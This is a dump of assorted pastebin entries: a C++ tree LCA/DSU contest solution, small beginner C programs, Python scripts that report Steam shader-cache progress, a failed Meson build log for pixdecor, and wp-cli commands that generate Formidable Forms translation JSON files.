j1yjp6Sf,dsu + lca,Kambarych,C++,Saturday 4th of May 2024 08:19:39 AM CDT,"#include <bits/stdc++.h>

#pragma comment(linker, ""/STACK:2000000"");

using namespace std;

#define For(i, n)           for(int i = 0; i < n; ++i)
#define all(x)              (x).begin(),(x).end()
#define rall(x)             (x).rbegin(),(x).rend()
#define ls(x)               x+x+1
#define rs(x)               x+x+2
#define endl                '\n'

#define ld                  long double
#define pii                 pair<int, int>
#define vt                  vector
#define ll                  long long

#define sim template < class c
#define ris return * this
#define dor > debug & operator <<
#define eni(x) sim > typename \
enable_if<sizeof dud<c>(0) x 1, debug&>::type operator<<(c i) {
sim > struct rge { c b, e; };
sim > rge<c> range(c i, c j) { return rge<c>{i, j}; }
sim > auto dud(c* x) -> decltype(cerr << *x, 0);
sim > char dud(...);
#define LOCAL
struct debug {
#ifdef LOCAL
~debug() { cerr << endl; }
eni(!=) cerr << boolalpha << i; ris; }
eni(==) ris << range(begin(i), end(i)); }
sim, class b dor(pair < b, c > d) {
ris << ""("" << d.first << "", "" << d.second << "")"";
}
sim dor(rge<c> d) {
*this << ""["";
for (auto it = d.b; it != d.e; ++it)
    *this << "", "" + 2 * (it == d.b) << *it;
ris << ""]"";
}
#else
sim dor(const c&) { ris; }
#endif
};
#define imie(...) "" ["" << #__VA_ARGS__ "": "" << (__VA_ARGS__) << ""] ""

template<typename T> void read(vt<T> & a) {For(i, a.size()) cin >> a[i];}
template<typename T> void read2(vt<vt<T> > & a) {For(i, a.size()) read(a[i]);}
template<typename T> void print(vt<T> & a) {For(i, a.size()) cout << a[i] << "" ""; cout << endl;}
template<typename T> void print2(vt<vt<T> > & a) {For(i, a.size()) print(a[i]);}

const int MAX = 1e9;
const int MOD = 1000000007;
const ll  INF = 1e18;
const ld  PI  = 3.14159265358979323846;

struct node {
	ll value;
	node() : value(MAX) {};

	node(ll value) : value(value) {};

	static node merge(node & n1, node & n2) {
		node r(min(n1.value, n2.value));
		return r;
	}
};

template<typename T>
struct lca_tree {
    int N, L;
    vt<int> par, depth;
    vt<T> val;
    vt<vt<int> > dp_par; // dp_par[0] is itself 
    vt<vt<T> > dp_val;
    int timer;
    vt<int> in, out;

    lca_tree() {}

    lca_tree(int N) {
        this->N      = N;
        this->L      = log2(N) + 2;
        this->par    = vt<int> (N, -1);
        this->val    = vt<T> (N);
        this->depth  = vt<int> (N);
        this->in     = vt<int> (N);
        this->out    = vt<int> (N);
        this->timer  = 0;
    }

    lca_tree(vt<T> val) {
        this->N      = val.size();
        this->L      = log2(N) + 2;
        this->par    = vt<int> (N, -1);
        this->val    = val;
        this->depth  = vt<int> (N);
        this->in     = vt<int> (N);
        this->out    = vt<int> (N);
        this->timer  = 0;
    }

    void dfs(int v, int p, vt<vt<int> > & g) {
        in[v] = ++timer;
        par[v] = p;
        if (p != -1) {
            depth[v] = depth[p] + 1;
        }

        for (int u : g[v]) {
            if (u == p) continue;
            dfs(u, v, g);
        }

        out[v] = timer;
    }

    void calc_dp_par() {
        dp_par = vt<vt<int> >(N, vt<int> (L, -1));

        for (int i = 0; i < N; i++) {
            dp_par[i][0] = i;
            dp_par[i][1] = par[i];
        }

        for (int l = 2; l < L; l++) {
            for (int i = 0; i < N; i++) {
                int par = dp_par[i][l - 1];
                if (par != -1) {
                    dp_par[i][l] = dp_par[par][l - 1];
                }
            }
        }
    }

    void calc_dp_val() {
        dp_val = vt<vt<T> >(N, vt<T> (L));

        for (int i = 0; i < N; i++) {
            dp_val[i][0] = val[i];
            dp_val[i][1] = val[i];
            if (par[i] != -1) {
                dp_val[i][1] = T::merge(dp_val[i][1], val[par[i]]);
            }
        }

        for (int l = 2; l < L; l++) {
            for (int i = 0; i < N; i++) {
                int par = dp_par[i][l - 1];
                if (par != -1) {
                    dp_val[i][l] = T::merge(dp_val[i][l - 1], dp_val[par][l - 1]);
                }
            }
        }
    }

    bool is_par(int v, int p) {
        return in[p] <= in[v] && out[v] <= out[p];
    }

    int lca(int node1, int node2) {
        if (is_par(node2, node1)) {
            return node1;
        }

        if (is_par(node1, node2)) {
            return node2;
        }

        for (int i = L - 1; i >= 1; i--) {
            int par = dp_par[node1][i];
            if (par == -1) continue;
            if (!is_par(node2, par)) {
                node1 = par;
            }
        }

        return par[node1];
    }

    // returns -1 if k-th parent doesn't exist 
    int kth_par(int node, int k) {
        if (k >= N) {
            return -1;
        }

        for (int i = L - 1; i >= 1; i--) {
            int par = dp_par[node][i];
            if (k & (1 << (i - 1))) {
                k ^= (1 << (i - 1));
                node = par;
                if (node == -1) {
                    return -1;
                }
            }
        }

        return node;
    }

    T ans(int node, int k) {
        if (k < 0) {
            return T();
        }
        T val = T();

        for (int i = L - 1; i >= 1; i--) {
            int par = dp_par[node][i];
            if (par == -1) continue;
            if (k & (1 << (i - 1))) {
                k ^= (1 << (i - 1));
                val = T::merge(val, dp_val[node][i]);
                node = par;
            }
        }

        return T::merge(val, dp_val[node][0]);
    }

    // to simulate edge - set value of directed edge (u -> v) to v-th node
    T ans_between_edges(int node1, int node2) {
        int p = lca(node1, node2);
        T ans1 = ans(node1, depth[node1] - depth[p] - 1),
          ans2 = ans(node2, depth[node2] - depth[p] - 1);

        return T::merge(ans1, ans2);
    }

    T ans_between_nodes(int node1, int node2) {
        int p = lca(node1, node2);
        T ans1 = ans(node1, depth[node1] - depth[p]),
          ans2 = ans(node2, depth[node2] - depth[p]);

        return T::merge(ans1, ans2);
    }
};

struct DSU {
    int n, cnt;
    vt<int> par, sz;

    DSU(int n) {
        this->n = n;
        cnt = n;
        par = vt<int> (n); iota(all(par), 0);
    }

    int find(int v) {
        if (par[v] == v) {
            return v;
        }

        return par[v] = find(par[v]);
    }

    bool merge(int v, int u) {
        v = find(v);
        u = find(u);
        if (u == v) {
            return false;
        }

        cnt--;
        par[v] = u;

        return true;
    }

    bool is_connected() {
        return cnt == n;
    }
};

void solve() {
    int n; cin >> n;
    vt<vt<int> > g(n);
    For(i, n - 1) {
        int u, v; cin >> u >> v; u--, v--;
        g[u].push_back(v);
        g[v].push_back(u);
    }
    vt<int> freq(n); read(freq);
    For(i, n) freq[i]--;
    vt<int> inorder;
    vt<int> visited(n);
    auto dfs = [&] (auto dfs, int u, int p) -> void {
        if (visited[u]) {
            assert(0 == 1);
        }
        visited[u] = 1;
        inorder.push_back(u);
        for (int v : g[u]) {
            if (v == p) continue;
            dfs(dfs, v, u);
        }
    };
    dfs(dfs, 0, -1);
    lca_tree<node> t = lca_tree<node>(n);
    t.dfs(0, -1, g);
    t.calc_dp_par();
    vt<int> freq_last(n, -1);
    DSU dsu = DSU(n);
    for (int i : inorder) {
        int last = freq_last[freq[i]];
        if (last != -1) {
            int cur = i;
            int p = t.lca(last, cur);
            while (t.depth[last] > t.depth[p]) {
                int par = dsu.find(t.par[last]);
                dsu.merge(last, par);
                last = par;
            }
            while (t.depth[cur] > t.depth[p]) {
                int par = dsu.find(t.par[cur]);
                dsu.merge(cur, par);
                cur = par;
            }
        }
        freq_last[freq[i]] = i;
    }
    cout << dsu.cnt - 1 << endl;
}

// THE SOLUTION IS ALWAYS SIMPLE
// THE CODE IS ALWAYS SHORT

int main() {
    ios_base::sync_with_stdio(0); cin.tie(0); cout.tie(0);
#ifdef DEBUG
    freopen(""output.txt"", ""w"", stdout);
    freopen(""input.txt"", ""r"", stdin);
#endif
    int T = 1;
    cin >> T;
    For(t, T) {
        cout << ""Case #"" << t + 1 << "": "";
        solve();
    }
    return 0;
}"
HfwRyqba,SPL project,apl-mhd,C++,Saturday 4th of May 2024 08:14:09 AM CDT,"#include <stdio.h>
#include <stdlib.h>

struct show
{
   char name[255];
   char date[255];
   int total_ticket;
   int ticket_available;
   int price;
};

void addShow(struct show *listings, int *numShows)
{

   char name[255];
   char date[255];
   int total_ticket;
   int ticket_available;
   int price;

   // scanf(""%s"", &b);
   char a;
   printf(""------------------------------------------------\n"");

   printf(""Name of the show : "");
   getchar(); // consume new line
   gets(listings[*numShows].name);

   printf(""When will it go live : "");
   gets(listings[*numShows].date);

   printf(""Total tickets: "");
   scanf(""%d"", &listings[*numShows].total_ticket);

   printf(""Tickets currently available: "");
   scanf(""%d"", &listings[*numShows].ticket_available);

   printf(""Ticket price: "");
   scanf(""%d"", &listings[*numShows].price);

   // printf(""------------------------------------------------\n"");
   // printf(""Name of the show: %s\n"", listings[*numShows].name);
   // printf(""Shows at: %s\n"", listings[*numShows].date);
   // printf(""Total tickets: %d\n"", listings[*numShows].total_ticket);
   // printf(""Tickets currently available: %d\n"", listings[*numShows].ticket_available);
   // printf(""Ticket price: %d\n"", listings[*numShows].price);

   *numShows += 1;
}

void displayShows(struct show *listings, int numShows)
{
   printf(""------------------------------------------------\n"");
   for (int i = 0; i < numShows; i++)
   {
      printf(""Show no %d\n"", i + 1);
      printf(""Name of the show: %s\n"", listings[i].name);
      printf(""Shows at: %s\n"", listings[i].date);
      printf(""Total tickets: %d\n"", listings[i].total_ticket);
      printf(""Tickets currently available: %d\n"", listings[i].ticket_available);
      printf(""Ticket price: %d\n"", listings[i].price);
      printf(""\n"");
   }
}

void bookTicket(struct show *listing, int numShows, char *showName)
{

   for (int i = 0; i < numShows; i++)
   {

      int len = 0;
      while (showName[len] != '\0')
      {
         len++;
      }
      printf(""%d"", len);
   }
};

int main()
{

   struct show showsArray[500];

   int numShows = 0;
   int menu = 1;

   while (menu != 6)
   {

      printf(""1. Add a show\n"");
      printf(""2. Book a ticket\n"");
      printf(""3. List out the shows\n"");
      printf(""4. Save to file\n"");
      printf(""5. Load from file\n"");
      printf(""6. Exit\n"");

      scanf(""%d"", &menu);
      if (menu == 1)
      {
         addShow(showsArray, &numShows);
      }
      else if (menu == 3)
      {
         displayShows(showsArray, numShows);
      }
      printf(""------------------------------------------------\n"");
   }



   return 0;
}
"
VyuZzyw9,Untitled,dllbridge,C,Saturday 4th of May 2024 08:12:14 AM CDT,"

#include    <stdio.h>
#include   <string.h>



char sz[99] = ""SONY"";   
    
void foo(char *p);                                 // Заголовок


////////////////////////////////////////////////////
int main()                                        // 
{
	
	
	printf(""%s\n"", sz);
	
	foo(sz);
	
	printf(""%s\n"", sz);	
}



////////////////////////////////////////////////////
void foo(char *p)                                 // Прототип
{
	
	 int n = strlen(p);
	
//	 printf(""n = %d\n"", n);
	 
	 for(int i = 0; i < n; i++)
	 {
			
		p[i] = p[i]+1;	
	 }
}





"
0gdpARvb,Filesystem Abstractions,BilakshanP,C,Saturday 4th of May 2024 07:43:22 AM CDT,"#include <stdio.h>
#include <stdlib.h>

int main() {
    FILE *fp;
    char dataToWrite[100] = ""Sample text: Hello, file system!"";
    char dataRead[100];

    // Open a file for writing (creates file if it does not exist)
    fp = fopen(""sample.txt"", ""w"");
    if (fp == NULL) {
        perror(""Error opening file"");
        return -1;
    }

    // Write data to the file
    if (fwrite(dataToWrite, sizeof(char), sizeof(dataToWrite) / sizeof(char), fp) < sizeof(dataToWrite) / sizeof(char)) {
        perror(""Error writing to file"");
        fclose(fp);
        return -1;
    }

    // Close the file
    fclose(fp);

    // Open the file for reading
    fp = fopen(""sample.txt"", ""r"");
    if (fp == NULL) {
        perror(""Error opening file"");
        return -1;
    }

    // Read data from the file
    if (fread(dataRead, sizeof(char), sizeof(dataRead) / sizeof(char), fp) < sizeof(dataRead) / sizeof(char)) {
        perror(""Error reading from file"");
    } else {
        printf(""Data read from file: %s\n"", dataRead);
    }

    // Close the file
    fclose(fp);

    return 0;
}
"
35c2smGF,Steam: show state of fossilize_replay (tested on Linux) with logfile,DeaD_EyE,Python,Saturday 4th of May 2024 07:36:22 AM CDT,"import re
import time
from datetime import datetime as DateTime
from functools import cache
from pathlib import Path

import requests

reg = re.compile(r""\[(?P<year>\d{4})-(?P<month>\d{2})-(?P<day>\d{2}) (?P<hour>\d{2}):(?P<minute>\d{2}):(?P<second>\d{2})\] Still replaying (?P<appid>\d+) \(\d{2}%, (?P<done>\d+)\/(?P<total>\d+)\)"")


@cache
def appids():
    return {
        app[""appid""]: app[""name""]
        for app in requests.get(
            ""https://api.steampowered.com/ISteamApps/GetAppList/v2/""
        ).json()[""applist""][""apps""]
    }


def names_shadercache():
    return [appids()[appid] for appid in appids_shadercache()]


def mktime(result: dict) -> DateTime:
    return DateTime(
        *(
            int(result[name])
            for name in (""year"", ""month"", ""day"", ""hour"", ""minute"", ""second"")
        )
    )


def read_log():
    with Path.home().joinpath("".local/share/Steam/logs/shader_log.txt"").open() as fd:
        while True:
            line = fd.readline().rstrip()
            if not line:
                continue
            if match := reg.search(line):
                result = match.groupdict()
                dt = mktime(result)
                game = appids().get(int(result[""appid""]), ""Unknown"")
                progress = int(result[""done""]) / int(result[""total""])
                print(""\033c"", end="""")
                print(f""[{dt}] [{progress:06.2%}] {game}"")

                
if __name__ == ""__main__"":
    read_log()


# [2024-05-04 13:57:35] Still replaying 730 (80%, 1572280/1941272).
"
Ewj46KC4,Steam: show state of fossilize_replay (tested on Linux),DeaD_EyE,Python,Saturday 4th of May 2024 07:35:47 AM CDT,"import time

from functools import cache
from pathlib import Path

import requests
from psutil import process_iter


@cache
def appids():
    return {
        app[""appid""]: app[""name""]
        for app in requests.get(
            ""https://api.steampowered.com/ISteamApps/GetAppList/v2/""
        ).json()[""applist""][""apps""]
    }


def appids_shadercache():
    for process in process_iter():
        if process.name() != ""fossilize_replay"":
            continue
        cmd = Path(process.cmdline()[1])
        idx = cmd.parts.index(""shadercache"")
        yield int(cmd.parts[idx + 1])


def names_shadercache():
    return [appids().get(appid, ""Unknown"") for appid in appids_shadercache()]


if __name__ == ""__main__"":
    while True:
        print(""\033c"", end="""")
        print(""\n"".join(sorted(set(names_shadercache())) or [""Idle""]))
        time.sleep(5)
"
NHisLBmT,meson-log.txt,bluebyt,INI file,Saturday 4th of May 2024 07:10:02 AM CDT,"Build started at 2024-05-04T07:42:22.797835
Main binary: /usr/bin/python
Build Options: -Dprefix=/opt
Python system: Linux
The Meson build system
Version: 1.4.0
Source dir: /home/bluebyt/Downloads/pixdecor
Build dir: /home/bluebyt/Downloads/pixdecor/build
Build type: native build
Project name: pixdecor
Project version: 0.1.0
-----------
Detecting compiler via: `cc --version` -> 0
stdout:
cc (GCC) 13.2.1 20240417
Copyright (C) 2023 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.  There is NO
warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
-----------
Running command: cc -E -dM -
-----
-----------
Detecting linker via: `cc -Wl,--version` -> 0
stdout:
GNU ld (GNU Binutils) 2.42.0
Copyright (C) 2024 Free Software Foundation, Inc.
This program is free software; you may redistribute it under the terms of
the GNU General Public License version 3 or (at your option) a later version.
This program has absolutely no warranty.
-----------
stderr:
collect2 version 13.2.1 20240417
/usr/bin/ld -plugin /usr/lib/gcc/x86_64-pc-linux-gnu/13.2.1/liblto_plugin.so -plugin-opt=/usr/lib/gcc/x86_64-pc-linux-gnu/13.2.1/lto-wrapper -plugin-opt=-fresolution=/tmp/ccb66cpt.res -plugin-opt=-pass-through=-lgcc -plugin-opt=-pass-through=-lgcc_s -plugin-opt=-pass-through=-lc -plugin-opt=-pass-through=-lgcc -plugin-opt=-pass-through=-lgcc_s --build-id --eh-frame-hdr --hash-style=gnu -m elf_x86_64 -dynamic-linker /lib64/ld-linux-x86-64.so.2 -pie /usr/lib/gcc/x86_64-pc-linux-gnu/13.2.1/../../../../lib/Scrt1.o /usr/lib/gcc/x86_64-pc-linux-gnu/13.2.1/../../../../lib/crti.o /usr/lib/gcc/x86_64-pc-linux-gnu/13.2.1/crtbeginS.o -L/usr/lib/gcc/x86_64-pc-linux-gnu/13.2.1 -L/usr/lib/gcc/x86_64-pc-linux-gnu/13.2.1/../../../../lib -L/lib/../lib -L/usr/lib/../lib -L/usr/lib/gcc/x86_64-pc-linux-gnu/13.2.1/../../.. --version -lgcc --push-state --as-needed -lgcc_s --pop-state -lc -lgcc --push-state --as-needed -lgcc_s --pop-state /usr/lib/gcc/x86_64-pc-linux-gnu/13.2.1/crtendS.o /usr/lib/gcc/x86_64-pc-linux-gnu/13.2.1/../../../../lib/crtn.o
-----------
Sanity testing C compiler: cc
Is cross compiler: False.
Sanity check compiler command line: cc sanitycheckc.c -o sanitycheckc.exe -D_FILE_OFFSET_BITS=64
Sanity check compile stdout:

-----
Sanity check compile stderr:

-----
Running test binary command:  /home/bluebyt/Downloads/pixdecor/build/meson-private/sanitycheckc.exe
C compiler for the host machine: cc (gcc 13.2.1 ""cc (GCC) 13.2.1 20240417"")
C linker for the host machine: cc ld.bfd 2.42.0
-----------
Detecting archiver via: `gcc-ar --version` -> 0
stdout:
GNU ar (GNU Binutils) 2.42.0
Copyright (C) 2024 Free Software Foundation, Inc.
This program is free software; you may redistribute it under the terms of
the GNU General Public License version 3 or (at your option) any later version.
This program has absolutely no warranty.
-----------
-----------
Detecting compiler via: `c++ --version` -> 0
stdout:
c++ (GCC) 13.2.1 20240417
Copyright (C) 2023 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.  There is NO
warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
-----------
Running command: c++ -E -dM -
-----
-----------
Detecting linker via: `c++ -Wl,--version` -> 0
stdout:
GNU ld (GNU Binutils) 2.42.0
Copyright (C) 2024 Free Software Foundation, Inc.
This program is free software; you may redistribute it under the terms of
the GNU General Public License version 3 or (at your option) a later version.
This program has absolutely no warranty.
-----------
stderr:
collect2 version 13.2.1 20240417
/usr/bin/ld -plugin /usr/lib/gcc/x86_64-pc-linux-gnu/13.2.1/liblto_plugin.so -plugin-opt=/usr/lib/gcc/x86_64-pc-linux-gnu/13.2.1/lto-wrapper -plugin-opt=-fresolution=/tmp/ccGspF68.res -plugin-opt=-pass-through=-lgcc_s -plugin-opt=-pass-through=-lgcc -plugin-opt=-pass-through=-lc -plugin-opt=-pass-through=-lgcc_s -plugin-opt=-pass-through=-lgcc --build-id --eh-frame-hdr --hash-style=gnu -m elf_x86_64 -dynamic-linker /lib64/ld-linux-x86-64.so.2 -pie /usr/lib/gcc/x86_64-pc-linux-gnu/13.2.1/../../../../lib/Scrt1.o /usr/lib/gcc/x86_64-pc-linux-gnu/13.2.1/../../../../lib/crti.o /usr/lib/gcc/x86_64-pc-linux-gnu/13.2.1/crtbeginS.o -L/usr/lib/gcc/x86_64-pc-linux-gnu/13.2.1 -L/usr/lib/gcc/x86_64-pc-linux-gnu/13.2.1/../../../../lib -L/lib/../lib -L/usr/lib/../lib -L/usr/lib/gcc/x86_64-pc-linux-gnu/13.2.1/../../.. --version -lstdc++ -lm -lgcc_s -lgcc -lc -lgcc_s -lgcc /usr/lib/gcc/x86_64-pc-linux-gnu/13.2.1/crtendS.o /usr/lib/gcc/x86_64-pc-linux-gnu/13.2.1/../../../../lib/crtn.o
-----------
Sanity testing C++ compiler: c++
Is cross compiler: False.
Sanity check compiler command line: c++ sanitycheckcpp.cc -o sanitycheckcpp.exe -D_FILE_OFFSET_BITS=64
Sanity check compile stdout:

-----
Sanity check compile stderr:

-----
Running test binary command:  /home/bluebyt/Downloads/pixdecor/build/meson-private/sanitycheckcpp.exe
C++ compiler for the host machine: c++ (gcc 13.2.1 ""c++ (GCC) 13.2.1 20240417"")
C++ linker for the host machine: c++ ld.bfd 2.42.0
-----------
Detecting compiler via: `cc --version` -> 0
stdout:
cc (GCC) 13.2.1 20240417
Copyright (C) 2023 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.  There is NO
warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
-----------
Running command: cc -E -dM -
-----
-----------
Detecting linker via: `cc -Wl,--version` -> 0
stdout:
GNU ld (GNU Binutils) 2.42.0
Copyright (C) 2024 Free Software Foundation, Inc.
This program is free software; you may redistribute it under the terms of
the GNU General Public License version 3 or (at your option) a later version.
This program has absolutely no warranty.
-----------
stderr:
collect2 version 13.2.1 20240417
/usr/bin/ld -plugin /usr/lib/gcc/x86_64-pc-linux-gnu/13.2.1/liblto_plugin.so -plugin-opt=/usr/lib/gcc/x86_64-pc-linux-gnu/13.2.1/lto-wrapper -plugin-opt=-fresolution=/tmp/ccqgioTM.res -plugin-opt=-pass-through=-lgcc -plugin-opt=-pass-through=-lgcc_s -plugin-opt=-pass-through=-lc -plugin-opt=-pass-through=-lgcc -plugin-opt=-pass-through=-lgcc_s --build-id --eh-frame-hdr --hash-style=gnu -m elf_x86_64 -dynamic-linker /lib64/ld-linux-x86-64.so.2 -pie /usr/lib/gcc/x86_64-pc-linux-gnu/13.2.1/../../../../lib/Scrt1.o /usr/lib/gcc/x86_64-pc-linux-gnu/13.2.1/../../../../lib/crti.o /usr/lib/gcc/x86_64-pc-linux-gnu/13.2.1/crtbeginS.o -L/usr/lib/gcc/x86_64-pc-linux-gnu/13.2.1 -L/usr/lib/gcc/x86_64-pc-linux-gnu/13.2.1/../../../../lib -L/lib/../lib -L/usr/lib/../lib -L/usr/lib/gcc/x86_64-pc-linux-gnu/13.2.1/../../.. --version -lgcc --push-state --as-needed -lgcc_s --pop-state -lc -lgcc --push-state --as-needed -lgcc_s --pop-state /usr/lib/gcc/x86_64-pc-linux-gnu/13.2.1/crtendS.o /usr/lib/gcc/x86_64-pc-linux-gnu/13.2.1/../../../../lib/crtn.o
-----------
Sanity testing C compiler: cc
Is cross compiler: False.
Sanity check compiler command line: cc sanitycheckc.c -o sanitycheckc.exe -D_FILE_OFFSET_BITS=64
Sanity check compile stdout:

-----
Sanity check compile stderr:

-----
Running test binary command:  /home/bluebyt/Downloads/pixdecor/build/meson-private/sanitycheckc.exe
C compiler for the build machine: cc (gcc 13.2.1 ""cc (GCC) 13.2.1 20240417"")
C linker for the build machine: cc ld.bfd 2.42.0
-----------
Detecting archiver via: `gcc-ar --version` -> 0
stdout:
GNU ar (GNU Binutils) 2.42.0
Copyright (C) 2024 Free Software Foundation, Inc.
This program is free software; you may redistribute it under the terms of
the GNU General Public License version 3 or (at your option) any later version.
This program has absolutely no warranty.
-----------
-----------
Detecting compiler via: `c++ --version` -> 0
stdout:
c++ (GCC) 13.2.1 20240417
Copyright (C) 2023 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.  There is NO
warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
-----------
Running command: c++ -E -dM -
-----
-----------
Detecting linker via: `c++ -Wl,--version` -> 0
stdout:
GNU ld (GNU Binutils) 2.42.0
Copyright (C) 2024 Free Software Foundation, Inc.
This program is free software; you may redistribute it under the terms of
the GNU General Public License version 3 or (at your option) a later version.
This program has absolutely no warranty.
-----------
stderr:
collect2 version 13.2.1 20240417
/usr/bin/ld -plugin /usr/lib/gcc/x86_64-pc-linux-gnu/13.2.1/liblto_plugin.so -plugin-opt=/usr/lib/gcc/x86_64-pc-linux-gnu/13.2.1/lto-wrapper -plugin-opt=-fresolution=/tmp/ccDeJiOe.res -plugin-opt=-pass-through=-lgcc_s -plugin-opt=-pass-through=-lgcc -plugin-opt=-pass-through=-lc -plugin-opt=-pass-through=-lgcc_s -plugin-opt=-pass-through=-lgcc --build-id --eh-frame-hdr --hash-style=gnu -m elf_x86_64 -dynamic-linker /lib64/ld-linux-x86-64.so.2 -pie /usr/lib/gcc/x86_64-pc-linux-gnu/13.2.1/../../../../lib/Scrt1.o /usr/lib/gcc/x86_64-pc-linux-gnu/13.2.1/../../../../lib/crti.o /usr/lib/gcc/x86_64-pc-linux-gnu/13.2.1/crtbeginS.o -L/usr/lib/gcc/x86_64-pc-linux-gnu/13.2.1 -L/usr/lib/gcc/x86_64-pc-linux-gnu/13.2.1/../../../../lib -L/lib/../lib -L/usr/lib/../lib -L/usr/lib/gcc/x86_64-pc-linux-gnu/13.2.1/../../.. --version -lstdc++ -lm -lgcc_s -lgcc -lc -lgcc_s -lgcc /usr/lib/gcc/x86_64-pc-linux-gnu/13.2.1/crtendS.o /usr/lib/gcc/x86_64-pc-linux-gnu/13.2.1/../../../../lib/crtn.o
-----------
Sanity testing C++ compiler: c++
Is cross compiler: False.
Sanity check compiler command line: c++ sanitycheckcpp.cc -o sanitycheckcpp.exe -D_FILE_OFFSET_BITS=64
Sanity check compile stdout:

-----
Sanity check compile stderr:

-----
Running test binary command:  /home/bluebyt/Downloads/pixdecor/build/meson-private/sanitycheckcpp.exe
C++ compiler for the build machine: c++ (gcc 13.2.1 ""c++ (GCC) 13.2.1 20240417"")
C++ linker for the build machine: c++ ld.bfd 2.42.0
Build machine cpu family: x86_64
Build machine cpu: x86_64
Host machine cpu family: x86_64
Host machine cpu: x86_64
Target machine cpu family: x86_64
Target machine cpu: x86_64
Pkg-config binary missing from cross or native file, or env var undefined.
Trying a default Pkg-config fallback at pkg-config
Found pkg-config: YES (/usr/bin/pkg-config) 2.1.1
Determining dependency 'wayfire' with pkg-config executable '/usr/bin/pkg-config'
env[PKG_CONFIG_PATH]: 
env[PKG_CONFIG]: /usr/bin/pkg-config
-----------
Called: `/usr/bin/pkg-config --modversion wayfire` -> 1
stderr:
Package wayfire was not found in the pkg-config search path.
Perhaps you should add the directory containing `wayfire.pc'
to the PKG_CONFIG_PATH environment variable
Package 'wayfire', required by 'virtual:world', not found
-----------
CMake binary for host machine is not cached
CMake binary missing from cross or native file, or env var undefined.
Trying a default CMake fallback at cmake
Found CMake: /usr/bin/cmake (3.29.2)
Extracting basic cmake information
CMake Toolchain: Calling CMake once to generate the compiler state
Calling CMake (['/usr/bin/cmake']) in /home/bluebyt/Downloads/pixdecor/build/meson-private/__CMake_compiler_info__ with:
  - ""--trace-expand""
  - ""--trace-format=json-v1""
  - ""--no-warn-unused-cli""
  - ""--trace-redirect=cmake_trace.txt""
  - ""-G""
  - ""Ninja""
  - ""-DCMAKE_TOOLCHAIN_FILE=/home/bluebyt/Downloads/pixdecor/build/meson-private/__CMake_compiler_info__/CMakeMesonTempToolchainFile.cmake""
  - "".""
Try CMake generator: auto
Calling CMake (['/usr/bin/cmake']) in /home/bluebyt/Downloads/pixdecor/build/meson-private/cmake_wayfire with:
  - ""--trace-expand""
  - ""--trace-format=json-v1""
  - ""--no-warn-unused-cli""
  - ""--trace-redirect=cmake_trace.txt""
  - ""-DCMAKE_TOOLCHAIN_FILE=/home/bluebyt/Downloads/pixdecor/build/meson-private/cmake_wayfire/CMakeMesonToolchainFile.cmake""
  - "".""
  -- Module search paths:    ['/', '/opt', '/usr', '/usr/local']
  -- CMake root:             /usr/share/cmake
  -- CMake architectures:    ['libpyldb-util.cpython-312-x86-64-linux-gnu.so', 'libpyldb-util.cpython-312-x86-64-linux-gnu.so.2', 'libpyldb-util.cpython-312-x86-64-linux-gnu.so.2.9.0', 'libpytalloc-util.cpython-312-x86-64-linux-gnu.so', 'libpytalloc-util.cpython-312-x86-64-linux-gnu.so.2', 'libpytalloc-util.cpython-312-x86-64-linux-gnu.so.2.4.2', 'libsamba-policy.cpython-312-x86-64-linux-gnu.so', 'libsamba-policy.cpython-312-x86-64-linux-gnu.so.0', 'libsamba-policy.cpython-312-x86-64-linux-gnu.so.0.0.1', 'libshiboken2.cpython-311-x86_64-linux-gnu.so', 'libshiboken2.cpython-311-x86_64-linux-gnu.so.5.15', 'libshiboken2.cpython-311-x86_64-linux-gnu.so.5.15.13']
  -- CMake lib search paths: ['lib', 'lib32', 'lib64', 'libx32', 'share', '', 'lib/libpyldb-util.cpython-312-x86-64-linux-gnu.so', 'lib/libpyldb-util.cpython-312-x86-64-linux-gnu.so.2', 'lib/libpyldb-util.cpython-312-x86-64-linux-gnu.so.2.9.0', 'lib/libpytalloc-util.cpython-312-x86-64-linux-gnu.so', 'lib/libpytalloc-util.cpython-312-x86-64-linux-gnu.so.2', 'lib/libpytalloc-util.cpython-312-x86-64-linux-gnu.so.2.4.2', 'lib/libsamba-policy.cpython-312-x86-64-linux-gnu.so', 'lib/libsamba-policy.cpython-312-x86-64-linux-gnu.so.0', 'lib/libsamba-policy.cpython-312-x86-64-linux-gnu.so.0.0.1', 'lib/libshiboken2.cpython-311-x86_64-linux-gnu.so', 'lib/libshiboken2.cpython-311-x86_64-linux-gnu.so.5.15', 'lib/libshiboken2.cpython-311-x86_64-linux-gnu.so.5.15.13']
Preliminary CMake check failed. Aborting.
Run-time dependency wayfire found: NO (tried pkgconfig and cmake)

meson.build:18:10: ERROR: Dependency ""wayfire"" not found, tried pkgconfig and cmake"
451n1Tu8,Formidable Forms Addons,nilovelez,Bash,Saturday 4th of May 2024 07:00:35 AM CDT,"# INSTRUCTIONS:
#
# locate the block that corresponds to your language
# for each language there are six commands that start with ""wp i18n"" and end with ""--no-purge""
# open Local terminan by clicking on ""Open site shell""
# copy the first command, paste in terminal an press enter
# it shoud say ""Success: Created 21 files.""
# repeat with the five remaining commands, one per line


# Spanish
wp i18n make-json wp-content/languages/plugins/formidable-es_ES.po wp-content/languages/plugins/ --no-purge
wp i18n make-json wp-content/plugins/formidable-pro/languages/formidable-pro-es_ES.po wp-content/plugins/formidable-pro/languages/ --no-purge
wp i18n make-json wp-content/plugins/formidable-charts/languages/frm-charts-es_ES.po wp-content/plugins/formidable-charts/languages/ --no-purge
wp i18n make-json wp-content/plugins/formidable-googlespreadsheet/languages/formidable-google-sheets-es_ES.po wp-content/plugins/formidable-googlespreadsheet/languages/ --no-purge
wp i18n make-json wp-content/plugins/formidable-modal/languages/formidable-modal-es_ES.po wp-content/plugins/formidable-modal/languages/ --no-purge
wp i18n make-json wp-content/plugins/formidable-views/languages/formidable-views-es_ES.po wp-content/plugins/formidable-views/languages/ --no-purge


# French
wp i18n make-json wp-content/languages/plugins/formidable-fr_FR.po wp-content/languages/plugins/ --no-purge
